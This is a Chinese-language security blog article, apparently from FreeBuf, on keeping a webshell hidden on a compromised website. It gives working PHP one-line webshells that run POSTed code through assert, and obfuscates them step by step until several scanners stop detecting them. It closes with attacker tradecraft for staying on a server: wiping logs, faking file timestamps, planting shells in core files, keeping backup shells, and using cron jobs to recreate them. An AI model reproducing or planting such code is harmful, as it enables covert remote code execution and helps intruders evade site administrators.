> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rupexkvrnon3cWJ2y-JoSQ)

拿下一个站后总希望自己的后门能够很隐蔽！不让网站管理员或者其他的 Hacker 发现，网上关于隐藏后门的方法也很多，如加密、包含，解析漏洞、加隐藏系统属性等等，但大部分已经都不实用了，随便找一个查马的程序就能很快的查出来，下面分享我总结的一些经验：

制作免杀 webshell
-------------

隐藏 webshell 最主要的就是做免杀，免杀做好了，你可以把 webshell 放在函数库文件中或者在图片马中，太多地方可以放了，只要查杀工具查不到，你的这个 webshell 就能存活很长时间，毕竟管理员也没有那么多精力挨个代码去查看。

命令执行的方法
-------

这里使用我们最常用的 php 的一句话马来给大家做演示，PHP 版本是 5.6 的，在写一句话马之前我们来先分析一下 PHP 执行命令方法

### 1、直接执行

使用 php 函数直接运行命令, 常见的函数有 (eval、system、assert) 等，可以直接调用命令执行。

```
@eval('echo 这是输出;');

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39kdQppTLXXLzpY5DadyYNqT4M1IwOcGxL39nhY0J07D9gA54RJtthBibmROmyKKhWIibIRzX7YAEag/640?wx_fmt=jpeg)

### 2、动态函数执行

我们先把一个函数名当成一个字符串传递给一个变量，在使用变量当作函数去执行

```
$a="phpinfo";$a();

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39kdQppTLXXLzpY5DadyYNqwwxb5dhWzqATEQBvt3noXnBCkAVkkvhALrLL6pZsWdUoUozmBT3ibZA/640?wx_fmt=jpeg)

### 3、文件包含执行

有两个 php 文件，我们把执行命令的放在文件 b 中，使用文件 a 去包含，达到执行的效果

```
b.php
<?php
@eval('echo 这是输出;');

a.php
<?php
include a.php

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39kdQppTLXXLzpY5DadyYNqLZgwunpra5hiaeKSOQYpyPVUGG66CeBvdyxzKIR9icibrbShDkibkXFovw/640?wx_fmt=jpeg)

### 4、回调函数

将想要执行命令的函数赋值给一个变量，再用一个可以调用函数执行的函数把变量解析成函数，这么说可能有点绕，看一下 array_map 函数的用法：array_map 函数中将 $arr 每个元素传给 func 函数去执行，例子：

```
<?php
$func = 'system';
$arr = array('whoami');
array_map($func, $arr);

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39kdQppTLXXLzpY5DadyYNqcicRAzTZbdupHDtib9FeuoupnGOeKRjYBx3vJoA7gabZ615yEDdfxelQ/640?wx_fmt=jpeg)

### 5、PHP Curly Syntax

我们可以理解为字符串中掺杂了变量，再使用变量去拼接字符串，达到命令执行的效果

```
<?php
$a = 'p';
eval("{$a}hpinfo();");

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39kdQppTLXXLzpY5DadyYNqcRjSbcRvdzlGlS8CrefAayh0icibFpSKml9No71ZuOxAfHpAcWE8HPiaw/640?wx_fmt=jpeg)

### 6、php 反序列化

这是根据 php 反序列化漏洞来实现命令执行，可以先创建一个反序列化的漏洞文件，再去调用反序列化函数`unserialize`

```
<?php

class test{
    public $a="123";
    public function __wakeup(){
        eval($this->a);
    }
}
unserialize('O:4:"test":1:{s:1:"a";s:10:"phpinfo();";}');

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39kdQppTLXXLzpY5DadyYNqaWPOF8oGOlpMvpBrCJiaWxN35iaNpmyJKbw8Zk4CoaJibCw9dHzomHoEw/640?wx_fmt=jpeg)

### 7、php://input 方法

`php://input`可以访问请求的原始数据的只读流，我们可以理解为我们传 post 参数，`php://input`会读取到，这时候我们就可以加以利用了

```
<?php
@eval(file_get_contents('php://input'));

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39kdQppTLXXLzpY5DadyYNqhEoqdSvbYWG9kbicqC2rTt4ejcgNqjZekfZgh1Dcp5SyjiaOUU8gdohA/640?wx_fmt=jpeg)

### 8、preg_replace 方法

`preg_replace`函数执行一个正则表达式的搜索和替换。我们可以使用一个命令执行函数去替换正常的字符串，然后去执行命令

```
<?php
echo preg_replace("/test/e",phpinfo(),"jutst test");

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39kdQppTLXXLzpY5DadyYNqiammibpbWGHp5pbaicDXQibfj2Tc4jL1tfBCv9g7yb5UFUdBgIjZothXew/640?wx_fmt=jpeg)

### 9、ob_start

ob_start 函数是打开输出控制缓冲，传入的参数会在使用`ob_end_flush`函数的时候去调用它执行输出在缓冲区的东西

```
<?php
$cmd = 'system';
ob_start($cmd);
echo "whoami";
ob_end_flush();//输出全部内容到浏览器

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39kdQppTLXXLzpY5DadyYNqSalpiaFybj9UVxuC2W95AaUzaSREbsG2iaIsJe0Y0aj5rZkTUt8z7DDQ/640?wx_fmt=jpeg)

编写免杀
----

上面说了那么多其实都是一句话木马的思路，每一种方式都可以写成一句话木马，而想要免杀常常会多种组合到一起，下面从最简单的木马一步步变形，达到免杀的目的

```
assert($_POST['x']);

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39kdQppTLXXLzpY5DadyYNqxmFUHZ51Gy0wNBwS1d466Jaicm2Uo2BiavicMexD6SsJIdXAofSZMsvyw/640?wx_fmt=jpeg)

这种就是最简单的一句话木马，使用 D 盾扫一下，可以看到 5 级，没有什么好说的

动态函数方法, 把`assert`这个函数赋值两次变量, 再把变量当成函数执行

```
$a = "assert";
$b = $a;
$b($_POST['x']);

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39kdQppTLXXLzpY5DadyYNq5GiasxBCAZGa4N1tcMnzjEaTLg4hqiczH4XhM85ajIwzmzFnYBc8rHlg/640?wx_fmt=jpeg)

回调函数方法，把`assert`函数当作参数传给`array_map`去调用执行

```
<?php
$fun = 'assert';
array_map($fun,array($_POST['x']));

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39kdQppTLXXLzpY5DadyYNqOKHK2ISiak0CCBTtUNQBB0JdAia6ObkHB9uDEsM146P40v1azGoEMOSA/640?wx_fmt=jpeg)

可以看到上面的都是通过两种方法的结合，简单的处理一下，就变成了 4 级，感兴趣的可以把其他的方法都尝试一下，4 级的很简单，我们去看看 3 级的都是怎么处理的

通过上面的`动态函数方法`我们可以思考，函数可以当成字符串赋值给变量，那么变量也一定能当成字符串赋值给变量，但调用时需要用`$$`

```
<?php
$a = "assert";
$c ='a';
$$c($_POST['x']);

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39kdQppTLXXLzpY5DadyYNq2nTdrcW2VGbib0xqiaLFmeXAQ3l6f0FukmKAQKAQ1mAFhZLRQwzPvtgA/640?wx_fmt=jpeg)

我们在把这种方法结合到回调函数方法中，可以看到，已经是 2 级了

```
<?php
$fun = 'assert';
$f = 'fun';
array_map($$f,array($_POST['x']));

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39kdQppTLXXLzpY5DadyYNqibibbmH5Y1YvkcoQgtHhbHMYOv2pJca2AhiaSxWHyKTuTU0YAJXdU7Q2w/640?wx_fmt=jpeg)

这时候我们看一下 D 盾中的说明：`array_map中的参数可疑`，我们这时候可以用函数封装一下参数

```
<?php
function ass(){
    $a = "a451.ass.aaa.ert.adaww";
    $b = explode('.',$a);
    $c = $b[1] . $b[3];
    return $c;
}
$b = array($_POST['x']);
$c = ass();
array_map($c,$b);

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39kdQppTLXXLzpY5DadyYNqkibfkgx6ZLH5Leib0V3QTibAeHhIawOFt6QyIymBj3iayBl3CQXlH8ppibQ/640?wx_fmt=jpeg)

1 级了，离目标近在咫尺了，这时候我们应该考虑让一句话木马像正常的代码，在好好的封装一下

```
<?php
function downloadFile($url,$x){
    $ary = parse_url($url);
    $file = basename($ary['path']);
    $ext = explode('.',$file);
    // assert
    $exec1=substr($ext[0],3,1);
    $exec2=substr($ext[0],5,1);
    $exec3=substr($ext[0],5,1);
    $exec4=substr($ext[0],4,1);
    $exec5=substr($ext[0],7,2);
    $as[0] = $exec1 . $exec2 . $exec3 . $exec4 . $exec5;
    $as[1] = $x;
    return $as;
}
$a = $_POST['x'];
$s  = downloadFile('http://www.baidu.com/asdaesfrtafga.txt',$a);
$b = $s[0];
$c = $s[1];
array_map($b,array($c));

```

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39kdQppTLXXLzpY5DadyYNqDjaibfs87PbEE7omzN7icZicpRcuqyh1WWLW9L1MPQO7ricR2bRjPKAxZw/640?wx_fmt=jpeg)

再试试其他免杀工具

WebShellKiller：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39kdQppTLXXLzpY5DadyYNqqMtPuTf5LMusK6ic5QvNGp6V66fvk4QtY62zd3VpG2avnF8xCl1jHqQ/640?wx_fmt=jpeg)

安全狗：

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39kdQppTLXXLzpY5DadyYNqKDptg7sJCiaXtgocVAFputKhMZnQaIt9TpFLABAkdAWtxBPeESNNFWg/640?wx_fmt=jpeg)

微步云沙箱

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39kdQppTLXXLzpY5DadyYNqx1ntibp0WV4eTav4kDHVjpkyGvaQmMXf4IuU6QbNlVjSrYKCkaXjwew/640?wx_fmt=jpeg)

再试试可不可以连接没有问题，完美！！

![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39kdQppTLXXLzpY5DadyYNqP9sdqyHtES80KyxIwGpGUciaWpIOribJCvsYenQZvHZHOagcRtzXWwXQ/640?wx_fmt=jpeg)

更好的隐藏 webshell 一些建议
-------------------

1、拿到权限以后, 把网站日志中的所有关于 webshell 的访问记录和渗透时造成的一些网站报错记录全部删除

2、把 webshell 的属性时间改为和同目录文件相同的时间戳, 比如 linux 中的 touch 就是非常好的工具

3、目录层级越深越好, 平时网站不出问题的话, 一般四五级目录很少会被注意到, 尽量藏在那些程序员和管理员都不会经常光顾的目录中比如: 第三方工具的一些插件目录, 主题目录, 编辑器的图片目录以及一些临时目录

4、利用 php.ini 配置文件隐藏 webshell, 把 webshell 的路径加入到配置文件中

5、尝试利用静态文件隐藏一句话, 然后用. htaccess 规则进行解析

6、上传个精心构造的图片马, 然后再到另一个不起眼的正常的网站脚本文件中去包含这个图片马

7、靠谱的方法就是直接把一句话插到正常的网站脚本文件里面, 当然最好是在一个不起眼的地方, 比如: 函数库文件, 配置文件里面等等, 以及那些不需要经常改动的文件……

8、如果有可能的话, 还是审计下目标的代码, 然后想办法在正常的代码中构造执行我们自己的 webshell, 即在原生代码中执行 webshell

9、webshell 里面尽量不要用类似 eval 这种过于敏感的特征, 因为 awk 一句话就能查出来, 除了 eval, 还有, 比如: exec,system,passthru,shell_exec,assert 这些函数都最好不要用, 你可以尝试写个自定义函数, 不仅能在一定程度上延长 webshell 的存活时间也加大了管理员的查找难度, 也可以躲避一些功能比较简陋 waf 查杀, 此外, 我们也可以使用一些类似: call_user_func,call_user_func_array, 诸如此类的回调函数特性来构造我们的 webshell, 即伪造正常的函数调用

10、webshell 的名字千万不要太扎眼, 比如: hack.php,sb.php,x.php 这样的名字严禁出现……, 在给 webshell 起名的时候尽量跟当前目录的, 其他文件的名字相似度高一点, 这样相对容易混淆视听, 比如: 目录中有个叫 new.php 的文件, 那你就起个 news.php

11、如果是大马的话, 尽量把里面的一些注释和作者信息全部都去掉, 比如 intitle 字段中的版本信息等等, 用任何大马之前最好先好好的读几遍代码, 把里面的 shell 箱子地址全部去掉推荐用开源的大马, 然后自己拿过来仔细修改, 记住, 我们的 webshell 尽量不要用加密, 因为加密并不能很好的解决 waf 问题, 还有, 大马中一般都会有个 pass 或者 password 字符, 建议把这些敏感字段全部换成别的, 因为利用这样的字符基本一句话就能定位到

12、养成一个好习惯, 为了防止权限很快丢失, 最好再同时上传几个备用 webshell, 注意, 每个 webshell 的路径和名字千万不要都一样更不要在同一个目录下, 多跳几层, 记住, 确定 shell 正常访问就可以了, 不用再去尝试访问看看解析是否正常, 因为这样就会在日志中留下记录, 容易被查到

13、当然, 如果在拿到服务器权限以后, 也可以自己写个脚本每隔一段时间检测下自己的 webshell 是否还存在, 不存在就创建

14、在有权限的情况, 看看管理员是否写的有动态 webshell 监测脚本, 务必把脚本找出来, crontab 一般都能看见了

我这里只是根据个人经验总结了一些比较常用的, 当然, 肯定还有更多更好更高级的关于 webshell 的隐藏方法, 欢迎大家留言。

![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR38Tm7G07JF6t0KtSAuSbyWtgFA8ywcatrPPlURJ9sDvFMNwRT0vpKpQ14qrYwN2eibp43uDENdXxgg/640?wx_fmt=gif)

![](http://mmbiz.qpic.cn/mmbiz_png/3Uce810Z1ibJ71wq8iaokyw684qmZXrhOEkB72dq4AGTwHmHQHAcuZ7DLBvSlxGyEC1U21UMgSKOxDGicUBM7icWHQ/640?wx_fmt=png&wxfrom=200) 交易担保 FreeBuf+ FreeBuf + 小程序：把安全装进口袋 小程序

精彩推荐

  

  

  

  

****![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR3ib2xibAss1xbykgjtgKvut2LUribibnyiaBpicTkS10Asn4m4HgpknoH9icgqE0b0TVSGfGzs0q8sJfWiaFg/640?wx_fmt=jpeg)****

  

[![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR38BeMPIsiaPjUKaIib6ibHuCEJEC1aL7DzOUEkjCg6g8fes6CHHq8knicNw6F9VjnicFaicMIK9icoQrGE0A/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247485458&idx=1&sn=5d64429def7b9929c63d700ae165fbf1&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39AXOzIuxlNiahYZgWwiaicSdU6C17b5d9F7ncdz9Vm4W8WDLGOK7njZFWD1pTZmvZxjK8qGUWf0AlsA/640?wx_fmt=jpeg)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247485439&idx=1&sn=0aab66b0bbef868b577eac70d9705fff&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR3ibSZod64tZYfVs9eOO83Wq83nUmS51lkhNxf89EtGvGDD3Dlqria56Wl73fmg1kGk4WNKVN8AXCuEQ/640?wx_fmt=png)](https://mp.weixin.qq.com/s?__biz=Mzg2MTAwNzg1Ng==&mid=2247485424&idx=1&sn=1d4409309a035cb6ffcbdff54cc7ab7b&scene=21#wechat_redirect)  

**************![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR3icF8RMnJbsqatMibR6OicVrUDaz0fyxNtBDpPlLfibJZILzHQcwaKkb4ia57xAShIJfQ54HjOG1oPXBew/640?wx_fmt=gif)**************